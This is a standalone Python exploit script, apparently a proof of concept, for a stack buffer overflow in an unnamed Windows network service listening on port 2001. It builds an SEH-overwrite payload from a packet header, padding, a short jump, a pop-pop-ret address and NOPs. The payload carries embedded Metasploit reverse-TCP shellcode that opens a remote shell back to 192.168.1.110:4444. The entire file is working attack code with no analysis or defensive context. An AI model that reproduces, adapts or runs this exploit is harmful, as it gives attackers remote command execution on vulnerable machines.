#!/usr/bin/env python 
# -*- coding: utf8 -*- 

import socket
  
csock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
ret = csock.connect_ex(("192.168.1.4", 2001)) 

if (ret == 0):
	# bad chars: "\x0a\x0d\xae"
	print("link success")
	# header 13 bytes
	header =  "\xeb\x50\xeb\x50"
	header += "\x57\x00"  # packet type
	header += "\xff\xff\x00\x00"
	header += "\x01\x00"
	header += "\xff"
	
	
	# junk 284 bytes
	junk1 = '\x41' * 280
	# jump
	jump = "\xeb\x06\x41\x41"
	# ppr 4 bytes
	# 'Windows', {  'Ret' => 0x100022c4 }
	ppr = "\xc4\x22\x00\x10"
	
	# nops 20 bytes
	nops = "\x90" * 20
	
	# windows/shell_reverse_tcp - 351 bytes
	# http://www.metasploit.com
	# Encoder: x86/shikata_ga_nai
	# VERBOSE=false, LHOST=192.168.1.110, LPORT=4444, 
	# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
	# StagerRetryCount=10, StagerRetryWait=5, 
	# PrependMigrate=false, EXITFUNC=thread
	shell = "\xba\xb9\x06\xd4\xa0\xda\xdf\xd9\x74\x24\xf4\x5e\x29\xc9" 
	shell += "\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\xef\x08\x36\x55\xf3" 
	shell += "\xfd\x34\x96\x0b\xfe\x58\x1e\xee\xcf\x58\x44\x7b\x7f\x69" 
	shell += "\x0e\x29\x8c\x02\x42\xd9\x07\x66\x4b\xee\xa0\xcd\xad\xc1" 
	shell += "\x31\x7d\x8d\x40\xb2\x7c\xc2\xa2\x8b\x4e\x17\xa3\xcc\xb3"
	shell += "\xda\xf1\x85\xb8\x49\xe5\xa2\xf5\x51\x8e\xf9\x18\xd2\x73" 
	shell += "\x49\x1a\xf3\x22\xc1\x45\xd3\xc5\x06\xfe\x5a\xdd\x4b\x3b" 
	shell += "\x14\x56\xbf\xb7\xa7\xbe\xf1\x38\x0b\xff\x3d\xcb\x55\x38" 
	shell += "\xf9\x34\x20\x30\xf9\xc9\x33\x87\x83\x15\xb1\x13\x23\xdd" 
	shell += "\x61\xff\xd5\x32\xf7\x74\xd9\xff\x73\xd2\xfe\xfe\x50\x69" 
	shell += "\xfa\x8b\x56\xbd\x8a\xc8\x7c\x19\xd6\x8b\x1d\x38\xb2\x7a" 
	shell += "\x21\x5a\x1d\x22\x87\x11\xb0\x37\xba\x78\xdd\xf4\xf7\x82" 
	shell += "\x1d\x93\x80\xf1\x2f\x3c\x3b\x9d\x03\xb5\xe5\x5a\x63\xec" 
	shell += "\x52\xf4\x9a\x0f\xa3\xdd\x58\x5b\xf3\x75\x48\xe4\x98\x85" 
	shell += "\x75\x31\x0e\xd5\xd9\xea\xef\x85\x99\x5a\x98\xcf\x15\x84" 
	shell += "\xb8\xf0\xff\xad\x53\x0b\x68\x12\x0b\x12\x06\xfa\x4e\x14" 
	shell += "\xc7\xa6\xc7\xf2\x8d\x46\x8e\xad\x39\xfe\x8b\x25\xdb\xff" 
	shell += "\x01\x40\xdb\x74\xa6\xb5\x92\x7c\xc3\xa5\x43\x8d\x9e\x97" 
	shell += "\xc2\x92\x34\xbf\x89\x01\xd3\x3f\xc7\x39\x4c\x68\x80\x8c" 
	shell += "\x85\xfc\x3c\xb6\x3f\xe2\xbc\x2e\x07\xa6\x1a\x93\x86\x27" 
	shell += "\xee\xaf\xac\x37\x36\x2f\xe9\x63\xe6\x66\xa7\xdd\x40\xd1" 
	shell += "\x09\xb7\x1a\x8e\xc3\x5f\xda\xfc\xd3\x19\xe3\x28\xa2\xc5"
	shell += "\x52\x85\xf3\xfa\x5b\x41\xf4\x83\x81\xf1\xfb\x5e\x02\x11" 
	shell += "\x1e\x4a\x7f\xba\x87\x1f\xc2\xa7\x37\xca\x01\xde\xbb\xfe" 
	shell += "\xf9\x25\xa3\x8b\xfc\x62\x63\x60\x8d\xfb\x06\x86\x22\xfb" 
	shell += "\x02"

	# junk2 (65212 - shell.length) bytes
	junk2 = '\x41' * (65212 - 351)

	# footer 2 bytes
	footer = "\r\n"
	
	payload = header + junk1 + jump + ppr + nops + shell + junk2 + footer
	
	csock.send(payload)
	print("sned success")
